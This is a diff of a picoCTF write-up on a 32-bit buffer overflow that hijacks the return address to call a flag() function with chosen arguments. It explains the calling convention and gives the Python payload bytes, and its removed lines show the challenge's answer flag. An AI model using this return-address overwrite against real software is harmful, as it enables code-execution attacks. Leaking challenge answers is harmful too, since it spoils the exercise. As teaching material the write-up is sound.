@@ -4,25 +4,36 @@ Now try overwriting arguments. Can you get the flag from this program? You can f
 
 - - - -
 ### Goal:
-
+Buffer overflow to get to the `flag()` function. Pass the correct arguments to the function to get the CTF flag.
 
 - - - -
 ### Solution:
+Similar to previous overflows, we will overflow the buffer and overwrite the return address to the address of the flag function. We found the address of the flag function by running `nm vuln` and this results in the following exploit so far:
 
-nm vuln
-080485e6 T flag
+```python
+cmd = b'A' * 176        # buffer
+cmd += b'B' * 4         # var -> .rodata:aFlagFileIsMiss+44
+cmd += b'C' * 4         # var -> .got.plt:_GLOBAL_OFFSET_TABLE_
+cmd += b'D' * 4         # var -> [stack]:FFF4D618
+cmd += p32(0x080485e6)  # overwrite return
+```
 
-Pass the following arguments when jumping to flag function
+Now we need to pass arguments to the flag function. Observe the x86 calling convention shown below:
+![x86 Calling Convention](https://www.cs.virginia.edu/~evans/cs216/guides/stack-convention.png)
 
-arg1
-0xDEADBEEF
+Once we are inside the `flag()` function we obtain the 1st argument by doing `ebp + 8` and the 2nd argument by doing `ebp + 12`.
 
-arg2
-0xC0DED00D
+So naturally the next question is ... where will `ebp` be when we are in the `flag()` function. In short, based on the prologue of a new function call, `ebp` will point to the beginning of the overwriten return in our exploit.
 
+Therefore, we need to add an extra four bytes after the overwritten return address before the first argument.
 
-- - - -
-### TODO:
-- Figure out why the stack needed to be set up the way that it was.
-
-picoCTF{arg5_and_r3turn55897b905}
+```python
+cmd = b'A' * 176        # buffer
+cmd += b'B' * 4         # var -> .rodata:aFlagFileIsMiss+44
+cmd += b'C' * 4         # var -> .got.plt:_GLOBAL_OFFSET_TABLE_
+cmd += b'D' * 4         # var -> [stack]:FFF4D618
+cmd += p32(0x080485e6)  # overwrite return
+cmd += b'E' * 4
+cmd += p32(0xDEADBEEF)  # arg1
+cmd += p32(0xC0DED00D)  # arg2
+```
